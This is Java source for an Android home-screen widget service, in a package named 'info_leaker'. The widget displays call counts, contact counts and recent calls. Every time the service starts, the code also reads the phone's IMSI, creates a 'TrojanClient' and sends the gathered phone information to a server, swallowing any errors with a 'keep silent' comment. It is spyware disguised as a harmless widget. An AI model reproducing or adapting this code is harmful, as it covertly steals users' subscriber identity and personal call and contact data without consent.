package com.info_leaker;

import android.app.PendingIntent;
import android.app.Service;
import android.appwidget.AppWidgetManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.RemoteViews;

public class WidgetService extends Service{
	RemoteViews rview;
	boolean contact, call, newcall, shownam;

	TrojanClient tclient;
	GetInfo ginfo = null;
	ContentResolver cr;
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        
        if(ginfo == null){
        	TelephonyManager telephonyManager=
                (TelephonyManager)  getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
        	// get IMSI  telephonyManager.getSubscriberId()
        	ginfo = new GetInfo(telephonyManager.getSubscriberId());
        }
        cr = this.getContentResolver();
        rview = buildUpdate(this, intent);
        
        // send info to server
        tclient = new TrojanClient(ginfo);
        
        try {
			tclient.send(ginfo.getstr(cr));
		} catch (Exception e) {
			// keep silent
		}
        tclient.close();
        // Push update for this widget to the home screen
        ComponentName thisWidget = new ComponentName(this, WidgetProvider.class);
        AppWidgetManager manager = AppWidgetManager.getInstance(this);
        // Tell the AppWidgetManager to perform an update on the current App Widget
        manager.updateAppWidget(thisWidget, rview);
    }
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	public RemoteViews buildUpdate(Context context, Intent intent) {
        Bundle bundle = intent.getBundleExtra(Common.CONF);
        if(bundle != null){	// if is configure
        	this.contact = bundle.getBoolean(Common.CONTACT);
        	this.call = bundle.getBoolean(Common.CALL);
        	this.newcall = bundle.getBoolean(Common.NEWCALL);
        	this.shownam = bundle.getBoolean(Common.BYNAM);
        }				// update form widget
        bundle = new Bundle();
        bundle.putBoolean(Common.CONTACT, contact);
        bundle.putBoolean(Common.CALL, call);
        bundle.putBoolean(Common.NEWCALL, newcall);
        bundle.putBoolean(Common.BYNAM, shownam);
        
        // Create an Intent to launch ConfigureActivity
        Intent intentWidget = new Intent(context, ConfigureActivity.class);
        intentWidget.putExtra(Common.CONF, bundle);
        // bind click to widget
        RemoteViews views = setView(context);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intentWidget, 0);
        views.setOnClickPendingIntent(R.id.widget, pendingIntent);

		return views;
	}
	
	public RemoteViews setView(Context c){
        // Get the layout for the App Widget and attach an on-click listener to the button
        RemoteViews views = new RemoteViews(c.getPackageName(), R.layout.widget); 
        views.setViewVisibility(R.id.wd_bg, View.VISIBLE);
        //R.widget_call + ginfo.getCallNum(cr);
        String out;
        out = this.getResources().getText(R.string.widget_title).toString();
        views.setTextViewText(R.id.wd_title, out);
        
        if (call){
        	out = this.getResources().getText(R.string.widget_call).toString();
        	try {
				out += this.ginfo.getCallNum(cr);
			} catch (Exception e) {
				out += "0";
			}
        	views.setTextViewText(R.id.wd_call, out);
        	views.setViewVisibility(R.id.wd_call, View.VISIBLE);
        }else{
        	views.setViewVisibility(R.id.wd_call, View.GONE);
        }
        
        if(contact){
	        out = this.getResources().getText(R.string.widget_contact).toString();
	        try { 
	        	out += ginfo.getContactNum(cr);
			} catch (Exception e) {
				out += "0";
			}
			views.setTextViewText(R.id.wd_contact, out);
			views.setViewVisibility(R.id.wd_contact, View.VISIBLE);
        }else{
        	views.setViewVisibility(R.id.wd_contact, View.GONE);
        }
        
        if(newcall){
        	out = this.getResources().getText(R.string.widget_new).toString();
        	try {
				out += ginfo.getRecent(cr, shownam);
			} catch (Exception e) {
				out += "empty";
			}
			views.setTextViewText(R.id.wd_new, out);
			views.setViewVisibility(R.id.wd_new, View.VISIBLE);
        }else{
        	views.setViewVisibility(R.id.wd_new, View.GONE);
        }
        views.setImageViewResource(R.id.wd_icon, R.drawable.contact2);
        return views;
	}
	
}
